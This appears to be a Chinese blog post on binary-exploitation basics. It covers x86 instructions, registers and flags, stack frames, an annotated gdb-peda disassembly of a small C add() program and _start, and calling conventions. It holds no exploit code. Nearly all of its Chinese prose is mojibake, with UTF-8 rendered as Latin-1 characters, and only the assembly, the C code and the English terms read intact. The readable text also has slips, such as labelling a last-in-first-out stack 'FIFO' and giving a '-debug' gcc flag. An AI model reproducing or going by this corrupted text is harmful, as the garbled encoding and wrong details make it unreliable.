è¿‡ä¸€ç‚¹pwnçš„åŸºç¡€ï¼Œæœ€è¿‘ä¹Ÿæ˜¯å†é‡æ–°å›é¡¾ä¸€ä¸‹ï¼Œäº†è§£ä¸€ä¸‹äºŒè¿›åˆ¶å®‰å…¨ã€‚\né€†å‘åŸºç¡€ amd64: 64ä½ AMD64ï¼Œæˆ–â€œx64â€ï¼Œæ˜¯ä¸€ç§64ä½å…ƒçš„ç”µè„‘å¤„ç†å™¨æ¶æ„ã€‚å®ƒæ˜¯åŸºäºç°æœ‰32ä½å…ƒçš„x86æ¶æ„ i386ï¼šâ€”â€” intel 80386 32ä½ï¼Œ é€šå¸¸ä½œä¸ºintel32ä½å¾®å¤„ç†å™¨ï¼ˆcpuï¼‰çš„ç»Ÿç§°ã€‚ å› ä¸º32ä½æŒ‡ä»¤é›†å…·æœ‰æ™®é€‚ï¼Œæ‰€ä»¥è¿™é‡Œä¸»è¦è®²è¿°x86-32ç‰ˆæœ¬çš„æ±‡ç¼–è¯­è¨€ã€‚\nx64 ä½“ç³»ç»“æ„æ˜¯ x86 çš„å‘åå…¼å®¹æ‰©å±•ã€‚ å®ƒæä¾›ä¸ x86 ç›¸åŒçš„æ—§ 32 ä½æ¨¡å¼ï¼Œä»¥åŠæ–°çš„ 64 ä½æ¨¡å¼ã€‚\nåŸºç¡€æ±‡ç¼–æŒ‡ä»¤ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 MOV EAX,ECX EAX = ECX ADD EAX,ECX EAX+=ECX SUB EAX,ECX EAX-=ECX INC EAX EAX++ DEC EAX\tEAXâ€” LEA EAX,[ECX+4] EAX = ECX+4 CMP EAX,ECX if(EAX == ECX) ZF = 1 else ZF = 0 TEST EAX,EAX if(EAX == 0) ZF = 1 else ZF = 0 JE(JZ) 04001000 ifï¼ˆZF == 1ï¼‰ GOTO 04001000 JNE(JNZ) 04001000 if(ZF == 0) GOTO 04001000 JMP 04001000 GOTO 04001000 CALL XXX è°ƒç”¨xxx PUSH 0000001 å°†0000001å…¥æ ˆ POP EAX å‡ºæ ˆå¹¶å°†è·å–çš„å€¼å­˜å…¥EAX å¯„å­˜å™¨åˆ†ç±» 32ä½å¯„å­˜å™¨å…±æœ‰16ä¸ª\næ•°æ®å¯„å­˜å™¨ æ•°æ®å¯„å­˜å™¨ä¸»è¦ç”¨æ¥ä¿å­˜æ“ä½œæ•°å’Œè¿ç®—ç»“æœç­‰ä¿¡æ¯ï¼Œä»è€ŒèŠ‚çœè¯»å–æ“ä½œæ•°æ‰€éœ€å ç”¨æ€»çº¿å’Œè®¿é—®å­˜å‚¨å™¨çš„æ—¶é—´ã€‚\n4ä¸ª32ä½é€šç”¨å¯„å­˜å™¨ï¼šEAXã€EBXã€ECXå’ŒEDXã€‚å¯¹ä½16ä½æ•°æ®çš„å–å­˜ï¼Œä¸ä¼šå½±å“é«˜16 ä½çš„æ•°æ®ï¼Œè¿™äº›ä½16ä½å¯„å­˜å™¨åˆ†åˆ«å‘½åä¸ºAXã€BXã€CXå’ŒDXï¼Œå®ƒå’Œå…ˆå‰çš„CPUä¸­çš„å¯„å­˜å™¨ç›¸ä¸€è‡´ã€‚ 4ä¸ª16ä½å¯„å­˜å™¨åˆå¯åˆ†å‰²æˆ8ä¸ªç‹¬ç«‹çš„8ä½å¯„å­˜å™¨ï¼ˆAXï¼šah~alã€BXï¼šbh~blã€CXï¼šch~clï¼šDXï¼šdh~dlï¼‰ AXå’Œalâ€”ç´¯åŠ å™¨ å¯ç”¨äºä¹˜/é™¤ã€è¾“å…¥/è¾“å‡ºç­‰ BXâ€”åŸºå€å¯„å­˜å™¨ å¯ä½œä¸ºå­˜å‚¨æŒ‡é’ˆä½¿ç”¨ CXâ€”è®¡æ•°å¯„å­˜å™¨ å¾ªç¯å’Œå­—ç¬¦ä¸²æ“ä½œæ—¶ï¼Œç”¨æ¥æ§åˆ¶å¾ªç¯æ¬¡æ•° ç§»å¤šä½æ—¶ï¼Œè¦ç”¨clæ¥æŒ‡æ˜ä½ç§»çš„ä½æ•° DXâ€”æ•°æ®å¯„å­˜å™¨ï¼Œä¹˜é™¤è¿ç®—æ—¶å¯ä½œä¸ºé»˜è®¤æ“ä½œæ•°å‚ä¸è¿ç®—ï¼Œä¹Ÿå¯å­˜æ”¾I/Oç«¯å£åœ°å€\nåœ¨16ä½CPUä¸­ï¼ŒAXã€BXã€CXå’ŒDXä¸èƒ½ä½œä¸ºåŸºå€å’Œå˜å€å¯„å­˜å™¨æ¥å­˜æ”¾å­˜å‚¨å•å…ƒçš„åœ°å€ï¼Œä½†åœ¨32ä½CPUä¸­ï¼Œå…¶32ä½å¯„å­˜å™¨EAXã€EBXã€ECXå’ŒEDXä¸ä»…å¯ä¼ é€æ•°æ®ã€æš‚å­˜æ•°æ®ã€ä¿å­˜ç®—æœ¯é€»è¾‘è¿ç®—ç»“æœï¼Œè€Œä¸”ä¹Ÿå¯ä½œä¸ºæŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ‰€ä»¥ï¼Œè¿™äº›32ä½å¯„å­˜å™¨æ›´å…·æœ‰é€šç”¨æ€§ã€‚\nå˜å€å¯„å­˜å™¨ ESI,EDI\nå®ƒä»¬ä¸»è¦ç”¨äºå­˜æ”¾å­˜å‚¨å•å…ƒåœ¨æ®µå†…çš„åç§»é‡ï¼Œç”¨å®ƒä»¬å¯å®ç°å¤šç§å­˜å‚¨å™¨æ“ä½œæ•°çš„å¯»å€æ–¹å¼ï¼Œä¸ºä»¥ä¸åŒçš„åœ°å€å½¢å¼è®¿é—®å­˜å‚¨å•å…ƒæä¾›æ–¹ä¾¿ã€‚\næŒ‡é’ˆå¯„å­˜å™¨ ESP, EBP\nä¸»è¦å­˜æ”¾å †æ ˆå†…å­˜å‚¨å•å…ƒçš„åç§»é‡ã€‚\nESPä¸ºæ ˆé¡¶ï¼ŒEBPä¸ºæ ˆåº•\næ®µå¯„å­˜å™¨ æ®µå¯„å­˜å™¨æ˜¯æ ¹æ®å†…å­˜åˆ†æ®µçš„ç®¡ç†æ¨¡å¼è€Œè®¾ç½®çš„ã€‚å†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€ç”±æ®µå¯„å­˜å™¨çš„å€¼å’Œä¸€ä¸ªåç§»é‡ç»„åˆè€Œæˆçš„ï¼Œè¿™æ ·å¯ç”¨ä¸¤ä¸ªè¾ƒå°‘ä½æ•°çš„å€¼ç»„åˆæˆä¸€ä¸ªå¯è®¿é—®è¾ƒå¤§ç‰©ç†ç©ºé—´çš„å†…å­˜åœ°å€ã€‚\nå…­ä¸ªæ®µå¯„å­˜å™¨å¦‚ä¸‹:\n1 2 3 CSï¼šä»£ç æ®µå¯„å­˜å™¨ ESï¼šé™„åŠ æ®µå¯„å­˜å™¨ DSï¼šæ•°æ®æ®µå¯„å­˜å™¨ FSï¼šé™„åŠ æ®µå¯„å­˜å™¨ SSï¼šå †æ ˆæ®µå¯„å­˜å™¨ GSï¼šé™„ä»¶æ®µå¯„å­˜å™¨ ä¸»è¦äº†è§£ï¼šCS,DS,SS\næŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ EIP:å­˜æ”¾ä¸‹æ¬¡å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤åœ¨ä»£ç æ®µçš„åç§»åœ°å€ï¼Œåœ¨å…·æœ‰é¢„å–æŒ‡ä»¤åŠŸèƒ½çš„ç³»ç»Ÿä¸­ï¼Œä¸‹æ¬¡è¦æ‰§è¡Œçš„æŒ‡ä»¤é€šå¸¸å·²è¢«é¢„å–åˆ°æŒ‡ä»¤é˜Ÿåˆ—ä¸­ï¼Œé™¤éå‘ç”Ÿè½¬ç§»æƒ…å†µï¼Œæ‰€ä»¥ï¼Œåœ¨ç†è§£å®ƒä»¬çš„åŠŸèƒ½æ—¶ä¸è€ƒè™‘å­˜åœ¨æŒ‡ä»¤é˜Ÿåˆ—çš„æƒ…å†µã€‚\nç†è§£çš„è¯å°±æ˜¯å­˜å–å½“è¿è¡Œå½“å‰æŒ‡ä»¤æ—¶ä¸‹ä¸€æ­¥è¦æ‰§è¡ŒæŒ‡ä»¤çš„åœ°å€ã€‚\næ ‡å¿—å¯„å­˜å™¨ EFlags:\nè¿ç®—ç»“æœæ ‡å¿—ä½ã€‚ä¸€å…±6ä¸ªï¼ŒåŒ…æ‹¬ï¼šCFè¿›ä½æ ‡å¿—ä½ã€PFå¥‡å¶æ ‡å¿—ä½ã€AFè¾…åŠ©è¿›ä½æ ‡å¿—ä½ã€ZFé›¶æ ‡å¿—ä½ã€SFç¬¦å·æ ‡å¿—ä½ã€OFæº¢å‡ºæ ‡å¿—ä½ã€‚ è®°å¿†é˜…è¯»ä¹Ÿè¾ƒä¸ºç®€å•ï¼šCF = Carry Flag , PF = Parity Flag , AF = Auxillary Carry Flag , ZF = zero Flag , SF = sign Flag, OF = overFlow Flag çŠ¶æ€æ§åˆ¶æ ‡å¿—ä½ã€‚ä¸€å…±3ä¸ªï¼ŒåŒ…æ‹¬ï¼šTFè¿½è¸ªæ ‡å¿—ä½ã€IFä¸­æ–­å…è®¸æ ‡å¿—ä½ã€DFæ–¹å‘æ ‡å¿—ä½ã€‚ æ•°æ®æœºæ„ æ ˆ æ ˆæ˜¯ä¸€ä¸ªå…ˆå…¥åå‡ºï¼ˆFirst In Last Out(FIFO)ï¼‰çš„å®¹å™¨ã€‚ç”¨äºå­˜æ”¾å‡½æ•°è¿”å›åœ°å€åŠå‚æ•°ã€ä¸´æ—¶å˜é‡å’Œæœ‰å…³ä¸Šä¸‹æ–‡çš„å†…å®¹ã€‚ç¨‹åºåœ¨è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šè‡ªåŠ¨é€šè¿‡å‹æ ˆå’Œå¼¹æ ˆå®Œæˆä¿å­˜å‡½æ•°ç°åœºç­‰æ“ä½œï¼Œä¸éœ€è¦ç¨‹åºå‘˜æ‰‹åŠ¨å¹²é¢„ã€‚\næ ˆç”±é«˜åœ°å€å‘ä½åœ°å€å¢é•¿ï¼Œæ ˆä¿å­˜äº†ä¸€ä¸ªå‡½æ•°è°ƒç”¨æ‰€éœ€è¦çš„ç»´æŠ¤ä¿¡æ¯ï¼Œç§°ä¸ºå †æ ˆå¸§ï¼ˆStack Frameï¼‰åœ¨ x86 ä½“ç³»ä¸­ï¼Œå¯„å­˜å™¨ ebp æŒ‡å‘å †æ ˆå¸§çš„åº•éƒ¨ï¼Œesp æŒ‡å‘å †æ ˆå¸§çš„é¡¶éƒ¨ã€‚å‹æ ˆæ—¶æ ˆé¡¶åœ°å€å‡å°ï¼Œå¼¹æ ˆæ—¶æ ˆé¡¶åœ°å€å¢å¤§ã€‚\nPUSHï¼šç”¨äºå‹æ ˆã€‚å°† esp å‡ 4ï¼Œç„¶åå°†å…¶å”¯ä¸€æ“ä½œæ•°çš„å†…å®¹å†™å…¥åˆ° esp æŒ‡å‘çš„å†…å­˜åœ°å€ POP ï¼šç”¨äºå¼¹æ ˆã€‚ä» esp æŒ‡å‘çš„å†…å­˜åœ°å€è·å¾—æ•°æ®ï¼Œå°†å…¶åŠ è½½åˆ°æŒ‡ä»¤æ“ä½œæ•°ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ªå¯„å­˜å™¨ï¼‰ä¸­ï¼Œç„¶åå°† esp åŠ  4ã€‚ x86 ä½“ç³»ä¸‹å‡½æ•°çš„è°ƒç”¨æ€»æ˜¯è¿™æ ·çš„ï¼š\næŠŠæ‰€æœ‰æˆ–ä¸€éƒ¨åˆ†å‚æ•°å‹å…¥æ ˆä¸­ï¼Œå¦‚æœæœ‰å…¶ä»–å‚æ•°æ²¡æœ‰å…¥æ ˆï¼Œé‚£ä¹ˆä½¿ç”¨æŸäº›ç‰¹å®šçš„å¯„å­˜å™¨ä¼ é€’ã€‚ æŠŠå½“å‰æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­ã€‚ è·³è½¬åˆ°å‡½æ•°ä½“æ‰§è¡Œã€‚ å…¶ä¸­ç¬¬ 2 æ­¥å’Œç¬¬ 3 æ­¥ç”±æŒ‡ä»¤ call ä¸€èµ·æ‰§è¡Œã€‚è·³è½¬åˆ°å‡½æ•°ä½“ä¹‹åå³å¼€å§‹æ‰§è¡Œå‡½æ•°ï¼Œè€Œ x86 å‡½æ•°ä½“çš„å¼€å¤´æ˜¯è¿™æ ·çš„ï¼š\npush ebpï¼šæŠŠebpå‹å…¥æ ˆä¸­ï¼ˆold ebpï¼‰ã€‚ mov ebp, espï¼šebp=espï¼ˆè¿™æ—¶ebpæŒ‡å‘æ ˆé¡¶ï¼Œè€Œæ­¤æ—¶æ ˆé¡¶å°±æ˜¯old ebpï¼‰ [å¯é€‰] sub esp, XXXï¼šåœ¨æ ˆä¸Šåˆ†é… XXX å­—èŠ‚çš„ä¸´æ—¶ç©ºé—´ã€‚ [å¯é€‰] push XXXï¼šä¿å­˜åä¸º XXX çš„å¯„å­˜å™¨ã€‚ è¿™é‡Œå…¶å®ç›¸å½“äºç”Ÿæˆæ–°çš„æ ˆå¸§ æŠŠebpå‹å…¥æ ˆä¸­ï¼Œæ˜¯ä¸ºäº†åœ¨å‡½æ•°è¿”å›æ—¶æ¢å¤ä»¥å‰çš„ebpå€¼ï¼Œè€Œå‹å…¥å¯„å­˜å™¨çš„å€¼ï¼Œæ˜¯ä¸ºäº†ä¿æŒæŸäº›å¯„å­˜å™¨åœ¨å‡½æ•°è°ƒç”¨å‰åä¿å­˜ä¸å˜ã€‚å‡½æ•°è¿”å›æ—¶çš„æ“ä½œä¸å¼€å¤´æ­£å¥½ç›¸åï¼š\n[å¯é€‰] pop XXXï¼šæ¢å¤ä¿å­˜çš„å¯„å­˜å™¨ã€‚ mov esp, ebpï¼šæ¢å¤espåŒæ—¶å›æ”¶å±€éƒ¨å˜é‡ç©ºé—´ã€‚ pop ebpï¼šæ¢å¤ä¿å­˜çš„ebpçš„å€¼ã€‚ retï¼šä»æ ˆä¸­å–å¾—è¿”å›åœ°å€ï¼Œå¹¶è·³è½¬åˆ°è¯¥ä½ç½®ã€‚ æ ˆå¸§å¯¹åº”çš„æ±‡ç¼–ä»£ç :\n1 2 3 4 5 6 7 PUSH ebp ; å‡½æ•°å¼€å§‹ï¼ˆä½¿ç”¨ebpå‰å…ˆæŠŠå·²æœ‰å€¼ä¿å­˜åˆ°æ ˆä¸­ï¼‰ MOV ebp, esp ; ä¿å­˜å½“å‰espåˆ°ebpä¸­ ... ; å‡½æ•°ä½“ ; æ— è®ºespå€¼å¦‚ä½•å˜åŒ–ï¼Œebpéƒ½ä¿æŒä¸å˜ï¼Œå¯ä»¥å®‰å…¨è®¿é—®å‡½æ•°çš„å±€éƒ¨å˜é‡ã€å‚æ•° MOV esp, ebp ; å°†å‡½æ•°çš„å…¶å®åœ°å€è¿”å›åˆ°espä¸­ POP ebp ; å‡½æ•°è¿”å›å‰å¼¹å‡ºä¿å­˜åœ¨æ ˆä¸­çš„ebpå€¼ RET ; å‡½æ•°è¿”å›å¹¶è·³è½¬ å‡½æ•°è°ƒç”¨åæ ˆçš„æ ‡å‡†å¸ƒå±€å¦‚ä¸‹å›¾ï¼š\nè¿™é‡Œé€šè¿‡ä¸€ä¸ªdemoæ¥è¿›è¡Œè°ƒè¯•ï¼š\n1 2 3 4 5 6 7 8 9 10 #include\u0026lt;stdio.h\u0026gt; int add(int a, int b) { int x = a, y = b; return (x + y); } int main() { int a = 1, b = 2; printf(\u0026#34;%d\\n\u0026#34;, add(a, b)); return 0; } gcc demo.c -m32 -debug -o demoç¼–è¯‘ç”Ÿæˆ32ä½ç¨‹åº\nä½¿ç”¨ gdb-pead æŸ¥çœ‹å¯¹åº”çš„mainå’Œaddä¸¤ä¸ªå‡½æ•°çš„ï¼Œè¿™é‡Œæˆ‘ä»¬ç»™å‡ºäº†è¯¦ç»†çš„æ³¨é‡Šï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 gdb-peda$ disassemble main Dump of assembler code for function main: 0x00000563 \u0026lt;+0\u0026gt;: lea ecx,[esp+0x4] ;å°† esp+0x4 çš„åœ°å€ä¼ ç»™ ecx 0x00000567 \u0026lt;+4\u0026gt;: and esp,0xfffffff0 ;æ ˆ 16 å­—èŠ‚å¯¹é½ 0x0000056a \u0026lt;+7\u0026gt;: push DWORD PTR [ecx-0x4] ;ecx-0x4ï¼Œå³åŸ esp å¼ºåˆ¶è½¬æ¢ä¸ºåŒå­—æ•°æ®åå‹å…¥æ ˆä¸­ 0x0000056d \u0026lt;+10\u0026gt;: push ebp ;ä¿å­˜è°ƒç”¨ main() å‡½æ•°ä¹‹å‰çš„ ebpï¼Œç”±äºåœ¨ _start ä¸­å°† ebp æ¸…é›¶äº†ï¼Œè¿™é‡Œçš„ ebp=0x0 0x0000056e \u0026lt;+11\u0026gt;: mov ebp,esp ;æŠŠè°ƒç”¨ main() ä¹‹å‰çš„ esp ä½œä¸ºå½“å‰æ ˆå¸§çš„ ebp 0x00000570 \u0026lt;+13\u0026gt;: push ebx ;ebxã€ecx å…¥æ ˆ 0x00000571 \u0026lt;+14\u0026gt;: push ecx 0x00000572 \u0026lt;+15\u0026gt;: sub esp,0x10 ;ä¸ºå±€éƒ¨å˜é‡ aã€b åˆ†é…ç©ºé—´å¹¶åšåˆ° 16 å­—èŠ‚å¯¹é½ 0x00000575 \u0026lt;+18\u0026gt;: call 0x440 \u0026lt;__x86.get_pc_thunk.bx\u0026gt; ;è°ƒç”¨ \u0026lt;__x86.get_pc_thunk.bx\u0026gt; å‡½æ•°ï¼Œå°† esp å¼ºåˆ¶è½¬æ¢ä¸ºåŒå­—æ•°æ®åä¿å­˜åˆ° ebx 0x0000057a \u0026lt;+23\u0026gt;: add ebx,0x1a86 ;ebx+0x1a86 0x00000580 \u0026lt;+29\u0026gt;: mov DWORD PTR [ebp-0x10],0x1 ;a ç¬¬äºŒä¸ªå…¥æ ˆæ‰€ä»¥ä¿å­˜åœ¨ ebp-0x10 çš„ä½ç½®ï¼Œæ­¤å¥å³ a=1 0x00000587 \u0026lt;+36\u0026gt;: mov DWORD PTR [ebp-0xc],0x2 ;b ç¬¬ä¸€ä¸ªå…¥æ ˆæ‰€ä»¥ä¿å­˜åœ¨ ebp-0xc çš„ä½ç½®ï¼Œæ­¤å¥å³ b=2 0x0000058e \u0026lt;+43\u0026gt;: push DWORD PTR [ebp-0xc] ;å°† b å‹å…¥æ ˆä¸­ 0x00000591 \u0026lt;+46\u0026gt;: push DWORD PTR [ebp-0x10] ;å°† a å‹å…¥æ ˆä¸­ 0x00000594 \u0026lt;+49\u0026gt;: call 0x53d \u0026lt;add\u0026gt; ;è°ƒç”¨ add() å‡½æ•°ï¼Œè¿”å›å€¼ä¿å­˜åœ¨ eax ä¸­ 0x00000599 \u0026lt;+54\u0026gt;: add esp,0x8 ;æ¸…ç† add() çš„å‚æ•° 0x0000059c \u0026lt;+57\u0026gt;: sub esp,0x8 ;è°ƒæ•´ esp ä½¿ 16 ä½å¯¹é½ 0x0000059f \u0026lt;+60\u0026gt;: push eax ;eax å…¥æ ˆ 0x000005a0 \u0026lt;+61\u0026gt;: lea eax,[ebx-0x19b0] ;ebx-0x19b0 çš„åœ°å€ä¿å­˜åˆ° eaxï¼Œè¯¥åœ°å€å¤„ä¿å­˜å­—ç¬¦ä¸² \u0026#34;%d\\n\u0026#34; 0x000005a6 \u0026lt;+67\u0026gt;: push eax ;eax å…¥æ ˆ 0x000005a7 \u0026lt;+68\u0026gt;: call 0x3d0 \u0026lt;printf@plt\u0026gt; ;è°ƒç”¨ printf() å‡½æ•° 0x000005ac \u0026lt;+73\u0026gt;: add esp,0x10 ;è°ƒæ•´æ ˆé¡¶æŒ‡é’ˆ espï¼Œæ¸…ç† printf() çš„å‚æ•° 0x000005af \u0026lt;+76\u0026gt;: mov eax,0x0 ;eax=0x0 0x000005b4 \u0026lt;+81\u0026gt;: lea esp,[ebp-0x8] ;ebp-0x8 çš„åœ°å€ä¿å­˜åˆ° esp 0x000005b7 \u0026lt;+84\u0026gt;: pop ecx ;å¼¹æ ˆæ¢å¤ ecxã€ebxã€ebp 0x000005b8 \u0026lt;+85\u0026gt;: pop ebx 0x000005b9 \u0026lt;+86\u0026gt;: pop ebp 0x000005ba \u0026lt;+87\u0026gt;: lea esp,[ecx-0x4] ;ecx-0x4 çš„åœ°å€ä¿å­˜åˆ° esp 0x000005bd \u0026lt;+90\u0026gt;: ret ;è¿”å›ï¼Œç›¸å½“äº pop eip; End of assembler dump. gdb-peda$ disassemble add Dump of assembler code for function add: 0x0000053d \u0026lt;+0\u0026gt;: push ebp ;ä¿å­˜è°ƒç”¨ add() å‡½æ•°ä¹‹å‰çš„ ebp 0x0000053e \u0026lt;+1\u0026gt;: mov ebp,esp ;æŠŠè°ƒç”¨ add() ä¹‹å‰çš„ esp ä½œä¸ºå½“å‰æ ˆå¸§çš„ ebp 0x00000540 \u0026lt;+3\u0026gt;: sub esp,0x10 ;ä¸ºå±€éƒ¨å˜é‡ xã€y åˆ†é…ç©ºé—´å¹¶åšåˆ° 16 å­—èŠ‚å¯¹é½ 0x00000543 \u0026lt;+6\u0026gt;: call 0x5be \u0026lt;__x86.get_pc_thunk.ax\u0026gt; ;è°ƒç”¨ \u0026lt;__x86.get_pc_thunk.ax\u0026gt; å‡½æ•°ï¼Œå°† esp å¼ºåˆ¶è½¬æ¢ä¸ºåŒå­—æ•°æ®åä¿å­˜åˆ° eax 0x00000548 \u0026lt;+11\u0026gt;: add eax,0x1ab8 ;eax+0x1ab8 0x0000054d \u0026lt;+16\u0026gt;: mov eax,DWORD PTR [ebp+0x8] ;å°† ebp+0x8 çš„æ•°æ® 0x1 ä¼ é€åˆ° eaxï¼Œebp+0x4 ä¸ºå‡½æ•°è¿”å›åœ°å€ 0x00000550 \u0026lt;+19\u0026gt;: mov DWORD PTR [ebp-0x8],eax ;ä¿å­˜ eax çš„å€¼ 0x1 åˆ° ebp-0x8 çš„ä½ç½® 0x00000553 \u0026lt;+22\u0026gt;: mov eax,DWORD PTR [ebp+0xc] ;å°† ebp+0xc çš„æ•°æ® 0x2 ä¼ é€åˆ° eax 0x00000556 \u0026lt;+25\u0026gt;: mov DWORD PTR [ebp-0x4],eax ;ä¿å­˜ eax çš„å€¼ 0x2 åˆ° ebp-0x4 çš„ä½ç½® 0x00000559 \u0026lt;+28\u0026gt;: mov edx,DWORD PTR [ebp-0x8] ;å–å‡º ebp-0x8 çš„å€¼ 0x1 åˆ° edx 0x0000055c \u0026lt;+31\u0026gt;: mov eax,DWORD PTR [ebp-0x4] ;å–å‡º ebp-0x4 çš„å€¼ 0x2 åˆ° eax 0x0000055f \u0026lt;+34\u0026gt;: add eax,edx ;eax+edx 0x00000561 \u0026lt;+36\u0026gt;: leave ;è¿”å›ï¼Œç›¸å½“äº mov esp,ebp; pop ebp; 0x00000562 \u0026lt;+37\u0026gt;: ret End of assembler dump. ç”±äº ELF æ–‡ä»¶çš„å…¥å£å…¶å®æ˜¯ _start è€Œä¸æ˜¯ main()ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜åº”è¯¥å…³æ³¨ä¸‹é¢çš„å‡½æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 gdb-peda$ disassemble _start Dump of assembler code for function _start: 0x00000400 \u0026lt;+0\u0026gt;: xor ebp,ebp ;æ¸…é›¶ ebpï¼Œè¡¨ç¤ºä¸‹é¢çš„ main() å‡½æ•°æ ˆå¸§ä¸­ ebp ä¿å­˜çš„ä¸Šä¸€çº§ ebp ä¸º 0x00000000 0x00000402 \u0026lt;+2\u0026gt;: pop esi ;å°† argc å­˜å…¥ esi 0x00000403 \u0026lt;+3\u0026gt;: mov ecx,esp ;å°†æ ˆé¡¶åœ°å€ï¼ˆargv å’Œ env æ•°ç»„çš„å…¶å®åœ°å€ï¼‰ä¼ ç»™ ecx 0x00000405 \u0026lt;+5\u0026gt;: and esp,0xfffffff0 ;æ ˆ 16 å­—èŠ‚å¯¹é½ 0x00000408 \u0026lt;+8\u0026gt;: push eax ;eaxã€espã€edx å…¥æ ˆ 0x00000409 \u0026lt;+9\u0026gt;: push esp 0x0000040a \u0026lt;+10\u0026gt;: push edx 0x0000040b \u0026lt;+11\u0026gt;: call 0x432 \u0026lt;_start+50\u0026gt; ;å…ˆå°†ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ 0x00000410 å‹æ ˆï¼Œè®¾ç½® esp æŒ‡å‘å®ƒï¼Œå†è°ƒç”¨ 0x00000432 å¤„çš„æŒ‡ä»¤ 0x00000410 \u0026lt;+16\u0026gt;: add ebx,0x1bf0 ;ebx+0x1bf0 0x00000416 \u0026lt;+22\u0026gt;: lea eax,[ebx-0x19d0] ;å– \u0026lt;__libc_csu_fini\u0026gt; åœ°å€ä¼ ç»™ eaxï¼Œç„¶åå‹æ ˆ 0x0000041c \u0026lt;+28\u0026gt;: push eax 0x0000041d \u0026lt;+29\u0026gt;: lea eax,[ebx-0x1a30] ;å– \u0026lt;__libc_csu_init\u0026gt; åœ°å€ä¼ å…¥ eaxï¼Œç„¶åå‹æ ˆ 0x00000423 \u0026lt;+35\u0026gt;: push eax 0x00000424 \u0026lt;+36\u0026gt;: push ecx ;ecxã€esi å…¥æ ˆä¿å­˜ 0x00000425 \u0026lt;+37\u0026gt;: push esi 0x00000426 \u0026lt;+38\u0026gt;: push DWORD PTR [ebx-0x8] ;è°ƒç”¨ main() å‡½æ•°ä¹‹å‰ä¿å­˜è¿”å›åœ°å€ï¼Œå…¶å®å°±æ˜¯ä¿å­˜ main() å‡½æ•°çš„å…¥å£åœ°å€ 0x0000042c \u0026lt;+44\u0026gt;: call 0x3e0 \u0026lt;__libc_start_main@plt\u0026gt; ;call æŒ‡ä»¤è°ƒç”¨ __libc_start_main å‡½æ•° 0x00000431 \u0026lt;+49\u0026gt;: hlt ;hlt æŒ‡ä»¤ä½¿ç¨‹åºåœæ­¢è¿è¡Œï¼Œå¤„ç†å™¨è¿›å…¥æš‚åœçŠ¶æ€ï¼Œä¸æ‰§è¡Œä»»ä½•æ“ä½œï¼Œä¸å½±å“æ ‡å¿—ã€‚å½“ RESET çº¿ä¸Šæœ‰å¤ä½ä¿¡å·ã€CPU å“åº”éå±è”½ç»ˆç«¯ã€CPU å“åº”å¯å±è”½ç»ˆç«¯ 3 ç§æƒ…å†µä¹‹ä¸€æ—¶ï¼ŒCPU è„±ç¦»æš‚åœçŠ¶æ€ï¼Œæ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ 0x00000432 \u0026lt;+50\u0026gt;: mov ebx,DWORD PTR [esp] ;esp å¼ºåˆ¶è½¬æ¢ä¸ºåŒå­—æ•°æ®åä¿å­˜åˆ° ebx 0x00000435 \u0026lt;+53\u0026gt;: ret ;è¿”å›ï¼Œç›¸å½“äº pop eip; 0x00000436 \u0026lt;+54\u0026gt;: xchg ax,ax ;äº¤æ¢ ax å’Œ ax çš„æ•°æ®ï¼Œç›¸å½“äº nop 0x00000438 \u0026lt;+56\u0026gt;: xchg ax,ax 0x0000043a \u0026lt;+58\u0026gt;: xchg ax,ax 0x0000043c \u0026lt;+60\u0026gt;: xchg ax,ax 0x0000043e \u0026lt;+62\u0026gt;: xchg ax,ax End of assembler dump. å‡½æ•°è°ƒç”¨çº¦å®š å‡½æ•°è°ƒç”¨çº¦å®šæ˜¯å¯¹å‡½æ•°è°ƒç”¨æ—¶å¦‚ä½•ä¼ é€’å‚æ•°çš„ä¸€ç§çº¦å®šã€‚è°ƒç”¨å‡½æ•°å‰è¦å…ˆæŠŠå‚æ•°å‹å…¥æ ˆç„¶åå†ä¼ é€’ç»™å‡½æ•°ã€‚\nä¸€ä¸ªè°ƒç”¨çº¦å®šå¤§æ¦‚æœ‰å¦‚ä¸‹çš„å†…å®¹ï¼š\nå‡½æ•°å‚æ•°çš„ä¼ é€’é¡ºåºå’Œæ–¹å¼ æ ˆçš„ç»´æŠ¤æ–¹å¼ åå­—ä¿®é¥°çš„ç­–ç•¥ ä¸»è¦çš„å‡½æ•°è°ƒç”¨çº¦å®šå¦‚ä¸‹ï¼Œå…¶ä¸­ cdecl æ˜¯ C è¯­è¨€é»˜è®¤çš„è°ƒç”¨çº¦å®šï¼š\nè°ƒç”¨çº¦å®š å‡ºæ ˆæ–¹ å‚æ•°ä¼ é€’ åå­—ä¿®é¥° cdecl å‡½æ•°è°ƒç”¨æ–¹ ä»å³åˆ°å·¦çš„é¡ºåºå‹å‚æ•°å…¥æ ˆ ä¸‹åˆ’çº¿ï¼‹å‡½æ•°å stdcall å‡½æ•°æœ¬èº« ä»å³åˆ°å·¦çš„é¡ºåºå‹å‚æ•°å…¥æ ˆ ä¸‹åˆ’çº¿ï¼‹å‡½æ•°åï¼‹@ï¼‹å‚æ•°çš„å­—èŠ‚æ•° fastcall å‡½æ•°æœ¬èº« éƒ½ä¸¤ä¸ª DWORDï¼ˆ4 å­—èŠ‚ï¼‰ç±»å‹æˆ–è€…å æ›´å°‘å­—èŠ‚çš„å‚æ•°è¢«æ”¾å…¥å¯„å­˜å™¨ï¼Œå…¶ä»–å‰©ä¸‹çš„å‚æ•°æŒ‰ä»å³åˆ°å·¦çš„é¡ºåºå‹å…¥æ ˆ @ï¼‹å‡½æ•°åï¼‹@ï¼‹å‚æ•°çš„å­—èŠ‚æ•° 